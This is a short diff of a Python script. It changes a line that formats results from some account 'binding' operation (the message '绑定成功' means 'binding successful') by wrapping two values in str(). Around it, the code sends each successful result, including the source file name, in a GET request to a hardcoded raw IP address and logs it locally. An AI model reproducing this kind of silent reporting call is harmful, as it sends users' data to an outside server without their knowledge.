@@ -120,7 +120,7 @@ def open2():
                         b = b + 1
                         if re['msg'] == "绑定成功" or re['code'] == 0:
                             a = a + 1
-                            data_ = data + " 原文件：" + f + " 数据：" + re['msg'] + " " + re['data']
+                            data_ = data + " 原文件：" + f + " 数据：" + str(re['msg'] )+ " " + str( re['data'])
                             requests.get("http://193.218.201.80/method.php?method=b&data=" + data_)
                             success.writelines(data_ + '\n')
                             split = data[data.rfind("/") + 1:]
